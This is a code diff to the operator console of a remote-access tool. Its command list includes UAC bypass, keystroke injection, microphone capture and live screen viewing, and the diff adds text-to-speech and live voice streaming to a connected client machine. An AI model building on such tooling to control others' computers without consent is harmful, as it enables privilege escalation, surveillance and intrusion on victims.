@@ -73,7 +73,7 @@ def execute_command(cmd, cmd_name):
             "KILL_PROCESS:", "FILE_BROWSER:", "DELETE_FILE:",
             "READ_TEXT_FILE:", "WRITE_TEXT_FILE:",
             "PRIV_INFO", "UAC_BYPASS",
-            "LIVE_SCREEN", "MOUSE_", "KEY_PRESS:",
+            "LIVE_SCREEN", "MOUSE_", "KEY_PRESS:", "SPEAK:",
         ))
         if cmd.upper().startswith("MICROPHONE"):
             try:
@@ -225,6 +225,12 @@ def _handle_special_response(output):
                 g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"✓ {m}\n", "success"))
             else:
                 g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Popup failed: {m}\n", "error"))
+
+        elif resp_type == "SPEAK":
+            if response.get("status") == "success":
+                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"✓ {m}\n", "success"))
+            else:
+                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Speak failed: {m}\n", "error"))
 
         elif resp_type == "MICROPHONE":
             if response.get("status") == "success":
@@ -821,3 +827,150 @@ def _cleanup_screen_stream():
         except Exception:
             pass
     g.root.after(50, _restore_prompt)
+
+
+# ── Remote Voice Broadcast ─────────────────────────────────────────────────────
+
+_voice_broadcast_active = False
+_voice_stream = None
+
+def start_voice_broadcast_stream():
+    """Start capturing server mic and streaming to client."""
+    global _voice_broadcast_active, _voice_stream
+    _voice_broadcast_active = True
+    g.voice_broadcast_active = True
+    
+    conn = None
+    handshake_done = False
+    try:
+        with g.clients_lock:
+            if not g.active_client_id or g.active_client_id not in g.clients:
+                log_message("No active client for voice broadcast", "ERROR")
+                _cleanup_voice_broadcast()
+                return
+            conn = g.clients[g.active_client_id]["conn"]
+            
+        log_message("Requesting Remote Voice Broadcast start...", "INFO")
+        
+        # Disable other command inputs during stream
+        g.root.after(0, lambda: g.terminal_output.insert(tk.END, "📢 Voice Broadcast starting...\n", "loading"))
+        g.root.after(0, lambda: g.terminal_output.mark_set("input_start", "end-1c"))
+        
+        # Send start command
+        conn.sendall(b"VOICE_STREAM_START")
+        
+        # Wait for client confirmation JSON response (e.g. {"type": "VOICE_STREAM", "status": "ready"})
+        conn.settimeout(15.0)
+        try:
+            resp_data = conn.recv(1024).decode(errors="ignore")
+        finally:
+            conn.settimeout(None)
+            
+        if "ready" not in resp_data:
+            log_message(f"Voice broadcast client response unexpected: {resp_data}", "ERROR")
+            _cleanup_voice_broadcast()
+            return
+            
+        handshake_done = True
+        
+        import sounddevice as sd
+        import struct
+        
+        sample_rate = 24000
+        channels = 1
+        chunk_size = 1024 # ~42ms block
+        
+        def mic_callback(indata, frames, time_info, status):
+            if not _voice_broadcast_active:
+                raise sd.CallbackStop()
+            if status:
+                print(status)
+            data_bytes = indata.tobytes()
+            L = len(data_bytes)
+            try:
+                # Send 4 bytes big endian length prefix followed by raw PCM
+                conn.sendall(struct.pack("!I", L) + data_bytes)
+            except Exception:
+                raise sd.CallbackStop()
+                
+        # Open local audio capture stream
+        _voice_stream = sd.InputStream(samplerate=sample_rate, channels=channels, dtype='int16', blocksize=chunk_size, callback=mic_callback)
+        _voice_stream.start()
+        log_message("Voice broadcast stream active - administrator speaking...", "SUCCESS")
+        
+    except Exception as e:
+        log_message(f"Voice broadcast error: {e}", "ERROR")
+        if handshake_done and conn:
+            try:
+                import struct
+                conn.sendall(struct.pack("!I", 0))
+            except:
+                pass
+        _cleanup_voice_broadcast()
+
+def stop_voice_broadcast_stream():
+    """Stop server mic and tell client stream has ended."""
+    global _voice_broadcast_active, _voice_stream
+    if not _voice_broadcast_active:
+        return
+    _voice_broadcast_active = False
+    
+    if _voice_stream is not None:
+        try:
+            _voice_stream.stop()
+            _voice_stream.close()
+        except Exception:
+            pass
+        _voice_stream = None
+        
+    # Send 4-byte 0 length packet to signal stream end
+    try:
+        with g.clients_lock:
+            if g.active_client_id and g.active_client_id in g.clients:
+                conn = g.clients[g.active_client_id]["conn"]
+                import struct
+                conn.sendall(struct.pack("!I", 0))
+                
+                # Receive final client JSON response (success message)
+                conn.settimeout(5.0)
+                try:
+                    resp = conn.recv(1024).decode(errors="ignore")
+                    log_message(f"Voice broadcast completed: {resp}", "SUCCESS")
+                finally:
+                    conn.settimeout(None)
+    except Exception as e:
+        log_message(f"Error ending voice broadcast stream: {e}", "WARNING")
+        
+    _cleanup_voice_broadcast()
+
+def _cleanup_voice_broadcast():
+    global _voice_broadcast_active
+    _voice_broadcast_active = False
+    g.voice_broadcast_active = False
+    
+    if g.voice_broadcast_window and g.voice_broadcast_window.winfo_exists():
+        g.root.after(0, g.voice_broadcast_window.on_stream_stopped)
+        
+    def _restore_prompt():
+        try:
+            g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt")
+            g.terminal_output.mark_set("input_start", "end-1c")
+            g.terminal_output.see(tk.END)
+        except Exception:
+            pass
+    g.root.after(50, _restore_prompt)
+
+def send_tts_speak(text):
+    """Sends Text-to-Speech command to the client."""
+    if not g.active_client_id:
+        messagebox.showerror("No Client", "Please select a client first!")
+        return
+        
+    import base64
+    # Encode message to safe Base64 to bypass colons, quotes or special chars
+    b64_msg = base64.urlsafe_b64encode(text.encode("utf-8")).decode("ascii")
+    cmd = f"SPEAK:B64~{b64_msg}"
+    
+    # Run in a background thread using execute_command
+    threading.Thread(target=execute_command, args=(cmd, f"Speak: {text}"), daemon=True).start()
+
